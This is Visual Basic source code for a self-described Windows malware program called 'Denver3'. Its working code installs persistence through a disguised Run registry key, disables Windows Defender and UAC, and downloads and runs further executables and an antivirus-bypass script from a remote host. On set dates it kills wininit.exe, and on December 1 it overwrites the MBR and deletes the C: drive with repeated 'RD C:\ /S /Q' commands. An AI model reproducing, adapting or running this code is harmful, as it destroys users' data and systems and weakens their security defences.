Imports System
Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Imports System.IO.Directory

Public Class Form1

    Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
    Dim ServerAddr = "https://denver3289yf998dh287hd9hd9827h.netlify.app/"
    Dim InstallPath = UserFoler & "\Denver3"
    Dim DebugMode = True

    Private Const SPI_SETDESKWALLPAPER As Integer = &H14
    Private Const SPIF_UPDATEINIFILE As Integer = &H1
    Private Const SPIF_SENDWININICHANGE As Integer = &H2
    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Const WallpaperFile As String = "c:\wallpaper.bmp"
    Dim Close1 As Boolean = False


    Private Sub DebugScript() 'Code to run on debug mode
        Error408.Show()
    End Sub


    Public Sub infect()

        Try
            My.Computer.FileSystem.CreateDirectory(InstallPath)
            IO.File.SetAttributes(InstallPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
        Catch ex As Exception
        End Try

        If My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.exe") Then
            Try
                My.Computer.FileSystem.DeleteFile(InstallPath & "\Denver3.exe")
            Catch ex As Exception

            End Try
        End If

        Try
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath & "\Denver3.exe")
        Catch ex As Exception
        End Try

        Try
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Windows security notifications_", InstallPath & "\Denver3.exe")
        Catch ex As Exception
        End Try
    End Sub

    Public Sub RunInitialSetup() ' code in this block will only run when the program first starts for the first time after the person has successfully confirmed that they know this is a virus.
        infect()
        DisableWindowsDefender()
        '  MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
        'vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")

        Try
            Dim path As String = InstallPath & "\Denver3.runtime"
            Dim fs As FileStream = File.Create(path)
            Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
            fs.Write(info, 0, info.Length)
            fs.Close()
            MyUtilities.RunCommandComInvis("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", "", False)
            Wait(1)
        Catch ex As Exception

        End Try
        Kill(1)
    End Sub


    Dim currentTime As System.DateTime = System.DateTime.Now

    Public Sub RunOnNotFirstRun()

        If My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
            Try
                My.Computer.Network.DownloadFile(ServerAddr & "Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
            Catch ex As Exception
                '  MsgBox("This program maintains a small file size by downloading its files from an external server. Please download and install the server manually: https://denver3289yf998dh287hd9hd9827h.netlify.app/ServerFiles.exe", 0 + 16, "Failed to download files")
            End Try
            Try
                My.Computer.Network.DownloadFile(ServerAddr & "AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
            Catch ex As Exception

            End Try
            DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code
            NoReg.Start()
            NoTask.Start()
            Dim payloadchance As Integer = CInt(Int((40 * Rnd()) + 1))

            If payloadchance = 1 Then
                MsgBox("opera gx is spyware", 0 + 16, "Dont use opera gx")

            ElseIf payloadchance = 2 Then
                Valve_Theme.Show()

            ElseIf payloadchance = 3 Then
                RipZ3CK100.ShowDialog()
            ElseIf payloadchance = 4 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "GDI.EXE", InstallPath & "\GDI.EXE")
                Catch ex As Exception

                End Try
                Try
                    Process.Start(InstallPath & "\GDI.EXE")
                Catch ex As Exception

                End Try
            End If


            If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
                RipConeehasOldAcc.Show()
            End If
            If currentTime.Month = 1 And currentTime.Date.Day = 2 Then

                Trolled.Show()
                Wait(45)
                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
            End If
            If currentTime.Month = 5 And currentTime.Date.Day = 13 Then
                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
            End If

            If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                MsgBox("Train is a furry: inside joke in my friend group (c) EEI 2024.")
            End If

            If currentTime.Month = 5 And currentTime.Date.Day = 27 Then
                Error408.Show()
            End If

            If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
                Dim random As New Random()
                Dim randomNumber As Integer = random.Next(1, 21)
                If randomNumber = 1 Then
                    MsgBox("Fuck you", 0 + 16, "die")
                    MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
                End If
            End If
            If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
                GoPlayHLAlyx.Show()
            End If
            If currentTime.Month = 2 And currentTime.Date.Day = 3 Then
                SetWallpaper(PIC_BILL_NYE.Image)
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "billnye.wav", InstallPath & "\billnye.wav")
                Catch ex As Exception
                End Try
                My.Computer.Audio.Play(InstallPath & "\billnye.wav", AudioPlayMode.BackgroundLoop)
            End If
            If currentTime.Month = 2 And currentTime.Date.Day = 7 Then
                nuke_computer.Show()
            End If


            If currentTime.Month = 3 And currentTime.Date.Day = 14 Then
                MsgBox(ToString(Math.PI))
            End If


            If currentTime.Month = 3 And currentTime.Date.Day = 1 Then
                GoPlayHL2.Show()
            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
                FreeRobuxGen.Show()
            End If

            If currentTime.Month = 10 And currentTime.Date.Day = 20 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "AvastMeme.wav", InstallPath & "\AvastMeme.wav")
                Catch ex As Exception
                End Try
                AvastMeme.Show()
                My.Computer.Audio.Play(InstallPath & "\AvastMeme.wav", AudioPlayMode.Background)
            End If
            If currentTime.Month = 5 And currentTime.Date.Day = 7 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "Hoax.Win32.BadJoke.BlastBtn.a.exe", InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                Catch ex As Exception

                End Try

                Try
                    Process.Start(InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START Hoax.Win32.BadJoke.BlastBtn.a.exe", 0 + 16, "ERROR")
                End Try

            End If



            If currentTime.Month = 6 And currentTime.Date.Day = 9 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
                Catch ex As Exception

                End Try
                MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
                Try
                    Process.Start(InstallPath & "\WBOUNCE.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
                End Try

            End If
            'CHOMP.exe


            If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
                Catch ex As Exception

                End Try
                MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
                Try
                    Process.Start(InstallPath & "\CHOMP.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
                End Try

            End If
            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
                Catch ex As Exception

                End Try
                Try
                    Process.Start(InstallPath & "\MTRAILS.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
                End Try
                Conewehwsqafv.Show()
            End If

            If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
                Catch ex As Exception

                End Try
                Try
                    Process.Start(InstallPath & "\MTRAILS.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
                End Try

            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 6 Then
                MsgBox("Old Roblox was better! I Have Uninstalled Roblox form your pc.")
                If My.Computer.FileSystem.DirectoryExists("C:\Users\%USERNAME%\AppData\Local\Roblox\") Then
                    MyUtilities.RunCommandComInvis("RD C:\Users\%USERNAME%\AppData\Local\Roblox\Versions /S /Q", "", False) 'Removes Roblox
                End If
            End If

            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
                MsgBox("Sub To danooct1!!!")
                Process.Start("https://www.youtube.com/watch?v=0CZ4I4COZEw")
            End If

            If currentTime.Month = 10 And currentTime.Date.Day = 19 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav")
                Catch ex As Exception

                End Try
                Try
                    My.Computer.Audio.Play(InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", AudioPlayMode.BackgroundLoop)
                Catch ex As Exception

                End Try
                IntroThing.Show()
            End If

            If currentTime.Month = 4 And currentTime.Date.Day = 20 Then
                SetWallpaper(pic_cannabis_leaf.Image)
            End If
            If currentTime.Month = 7 And currentTime.Day = 6 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
                Catch ex As Exception

                End Try
                Try
                    My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
                Catch ex As Exception

                End Try
                HELL_NAH.Show()
            End If
            If currentTime.Month = 2 And currentTime.Day = 8 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "screen-melter.exe", InstallPath & "\screen-melter.exe")
                Catch ex As Exception

                End Try
                Try
                    Process.Start(InstallPath & "\screen-melter.exe")
                Catch ex As Exception
                    MsgBox("FAILED TO START: screen-melter.exe", 0 + 16, "ERROR")
                End Try

            End If
            If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
                FreeRobuxGen.Show()
            End If
            If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
                Catch ex As Exception
                End Try
                My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
            End If
            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
                Catch ex As Exception

                End Try


                Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
            End If
            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
                Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
            End If
            If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
                MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
                'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")


                Catch ex As Exception

                End Try
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
                Catch ex As Exception

                End Try
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")

                Catch ex As Exception

                End Try
                My.Computer.Audio.Play(InstallPath & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
                MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
                For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
                    Process.Start(InstallPath & "\NAH.CMD")
                    Process.Start(InstallPath & "\NAH.CMD")
                    Process.Start(InstallPath & "\NAH.CMD")
                    Process.Start(InstallPath & "\NAH.CMD")
                    Process.Start(InstallPath & "\SkillE.vbs")
                Next
            End If

            If currentTime.Month = 7 And currentTime.Date.Day = 27 Then
                Rickroll.Show()
            End If
            If currentTime.Month = 8 And currentTime.Date.Day = 25 Then
                MsgBox("This is all your fault...", 0 + 64, "Denver3")
                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
            End If

            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav

                Catch ex As Exception

                End Try
                MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
                For index As Integer = 1 To 20
                    Process.Start(InstallPath & "\SkillE.vbs")
                Next
            End If

            If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
                MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
                Catch ex As Exception
                End Try
                For index As Integer = 1 To 30 'OverLoadAntiVirus
                    Try
                        My.Computer.FileSystem.CopyFile(InstallPath & "\AVTESTFILE.EXE", InstallPath & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
                    Catch ex As Exception
                    End Try
                Next
            End If

            If currentTime.Month = 4 And currentTime.Date.Day = 15 Then


            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
                Catch ex As Exception

                End Try
                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 25 Then
                MsgBox("ur worst nightmare")
                AAAAAAA.Show()
            End If
            If currentTime.Month = 8 And currentTime.Date.Day = 23 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
                Catch ex As Exception

                End Try
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
                Catch ex As Exception

                End Try
                Try
                    Process.Start(InstallPath & "\MTRAILS.exe")
                Catch ex As Exception
                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
                End Try
                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
            End If

            If currentTime.Month = 10 And currentTime.Date.Day = 2 Then
                ScreenStuck.Show()
            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 16 Then
                FitTeaTimer.Start()
            End If
            If currentTime.Month = 6 And currentTime.Date.Day = 17 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "STILLALI.EXE.wav", InstallPath & "\STILLALI.EXE.wav")
                Catch ex As Exception

                End Try
                My.Computer.Audio.Play(InstallPath & "\STILLALI.EXE.wav", AudioPlayMode.BackgroundLoop)
            End If
            If currentTime.Month = 11 Then
                Try
                    My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
                Catch ex As Exception
                End Try
                My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
                MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
            End If

            If currentTime.Month = 12 And currentTime.Day = 1 Or True = False Then
                fuckpc()
            End If
        End If

    End Sub

    Public Sub ChangeMD5AndExit()
        Try
            My.Computer.Network.DownloadFile(ServerAddr & "basic.MD5.antivirus.bypass.cmd", Application.StartupPath & "\basic.MD5.antivirus.bypass.cmd")
        Catch ex As Exception
        End Try
        Try
            Process.Start(Application.StartupPath & "\basic.MD5.antivirus.bypass.cmd")
        Catch ex As Exception
            MsgBox("Change MD5 function failed.")
        End Try
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If Not CheckIfFileExists("https://denver3289yf998dh287hd9hd9827h.netlify.app/killswitch.html") Then
            If CheckForInternetConnection() Then
                If Not CheckIfDownloadsWork() Then
                    MsgBox("Denver3's download check has failed. This program cannot run in offline mode and your current operating system does not support downloading files. Please use Windows 10 or 11", 0 + 16, "DENVER3 START ERROR")
                    Close1 = True
                    Me.Close()
                Else
                    If DebugMode Then
                        DebugScript()

                    Else
                        RunOnNotFirstRun()
                        If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
                            Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
                 "haha FBI can't arrest me now",
                 MessageBoxButtons.YesNo,
                  MessageBoxIcon.Warning)
                            If result1 = DialogResult.Yes Then
                                Dim result2 As DialogResult = MessageBox.Show("THIS IS YOUR LAST WARNING THIS IS A MALICIOUS PROGRAM IT WILL DO HARM TO YOUR COMPUTER BY CLICKING OKAY YOU FULLY ACKNOWLEDGED THAT THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE TO YOUR COMPUTER!",
                    "haha FBI can't arrest me now",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning)
                                If result2 = DialogResult.No Then
                                    Close1 = True
                                    Me.Close()
                                Else
                                    If CheckForInternetConnection() Then
                                        If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
                                            RunInitialSetup()
                                        End If
                                    Else
                                        MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
                                        Close1 = True
                                        Me.Close()
                                    End If
                                End If
                            Else
                                Close1 = True
                                Me.Close()
                            End If
                        End If
                    End If
                End If

            Else
                MsgBox("Denver3 needs an internet connection to work as it needs to connect to an external server to download critical files. Please check your internet connection and try again.", 0 + 16, "Please check your internet connection and try again.")
                Close1 = True
                Me.Close()
            End If
        Else
            MsgBox("The Denver3 server kill switch has been activated, official versions of the software will not work.", 0 + 16, "emergency kill switch")
        End If


    End Sub
    Public Sub fuckpc()
        Dim a1 As New still_using_this_computer()
        Dim a2 As New still_using_this_computer()
        Dim a3 As New still_using_this_computer()
        Dim a4 As New still_using_this_computer()
        Dim a5 As New still_using_this_computer()
        Dim a6 As New still_using_this_computer()
        Dim a7 As New still_using_this_computer()
        Dim a8 As New still_using_this_computer()
        Dim a9 As New still_using_this_computer()
        Dim a10 As New still_using_this_computer()
        Dim a11 As New still_using_this_computer()
        Dim a12 As New still_using_this_computer()
        Dim a13 As New still_using_this_computer()
        Dim a14 As New still_using_this_computer()
        Try
            My.Computer.Network.DownloadFile(ServerAddr & "SCP_SL_Light_Containment_Zone_8Bit.wav", InstallPath & "\urdone1.wav")
        Catch ex As Exception
        End Try
        My.Computer.Audio.Play(InstallPath & "\urdone1.wav", AudioPlayMode.BackgroundLoop)

        SetWallpaper(PIC_DEATH_WALPAPER.Image)
        Try
            My.Computer.Registry.ClassesRoot.CreateSubKey(".dll").SetValue("", "dll", Microsoft.Win32.RegistryValueKind.String)
            My.Computer.Registry.ClassesRoot.CreateSubKey("jkl\shell\open\command").SetValue("", Application.ExecutablePath &
        " ""%l"" ", Microsoft.Win32.RegistryValueKind.String)
        Catch ex As Exception

        End Try

        OverrideMBR()
        fuckedbydenver3.Show()
        completely_obliterate_hard_drive_files.RunWorkerAsync()
        For index As Integer = 0 To 9000
            ' Code to be executed inside the loop
            Try
                Dim random As New Random()
                Dim randomNumber As Integer = random.Next(1, 63463456)
                'My.Computer.FileSystem.CopyFile(InstallPath & "\Desktop\BonziBDY_4.EXE", InstallPath & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
                My.Computer.FileSystem.CopyFile(InstallPath & "\MbrOverwriter.exe", UserFoler & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
            Catch ex As Exception

            End Try
        Next

        ' Make a reference to a directory.
        fuckedbydenver3.ShowDialog()


        TrainIsAFurryLmao.ShowDialog()

        'weadfkfjgalhgweisdfjkgahup swedfokgoih;oaskljudfgh iou[kljdfzgilhdsfabipuyhog 8iyupasdfg8oyuiasd
        ' Display the names of the files.
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        Wait(10)
        Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
        Wait(3)
        a1.Show()
        a2.Show()
        a3.Show()
        Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
        Wait(4)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        Process.Start("https://www.google.com/search?q=windows+11+is+shit&oq=windows+11+is+shit&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCDQ4NDlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8")
        Wait(5)
        a4.Show()

        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("WINDOWS 11 IS ***CRAP**")
        OpenTextFile("ur mom")
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
        OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
        OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
        Try
            My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
        Catch ex As Exception

        End Try
        Try
            Process.Start(InstallPath & "\MTRAILS.exe")
        Catch ex As Exception
            MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
        End Try
        Wait(4)
        Try
            MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
